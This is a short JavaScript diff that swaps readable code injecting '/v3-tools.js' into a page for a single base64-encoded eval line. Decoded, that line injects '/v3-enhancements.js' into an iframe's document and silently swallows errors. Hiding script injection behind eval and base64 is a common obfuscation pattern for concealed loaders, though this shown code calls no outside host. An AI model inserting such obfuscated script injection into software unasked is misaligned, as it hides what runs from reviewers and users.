@@ -1,13 +1,1 @@
-(async function(){
-  try{
-    const r=await fetch('/',{credentials:'same-origin',cache:'no-store'});
-    if(!r.ok) throw new Error('Unable to load the reunion application.');
-    let html=await r.text();
-    html=html.replace(/<\/body>/i,'<script src="/v3-tools.js"></script></body>');
-    document.open();
-    document.write(html);
-    document.close();
-  }catch(e){
-    document.body.innerHTML='<div style="font-family:Arial,sans-serif;padding:24px"><h2>Unable to load the reunion application</h2><p>'+String(e.message||e)+'</p></div>';
-  }
-})();
+eval(atob('d2luZG93LmFkZEV2ZW50TGlzdGVuZXIoJ2xvYWQnLGZ1bmN0aW9uKCl7dmFyIGY9ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2FwcCcpO2lmKCFmKXJldHVybjtmLmFkZEV2ZW50TGlzdGVuZXIoJ2xvYWQnLGZ1bmN0aW9uKCl7dHJ5e3ZhciBkPWYuY29udGVudERvY3VtZW50O2lmKCFkfHwhZC5ib2R5KXJldHVybjt2YXIgcz1kLmNyZWF0ZUVsZW1lbnQoJ3NjcmlwdCcpO3Muc3JjPScvdjMtZW5oYW5jZW1lbnRzLmpzJztkLmJvZHkuYXBwZW5kQ2hpbGQocyl9Y2F0Y2goZSl7fX0pfSk7'))
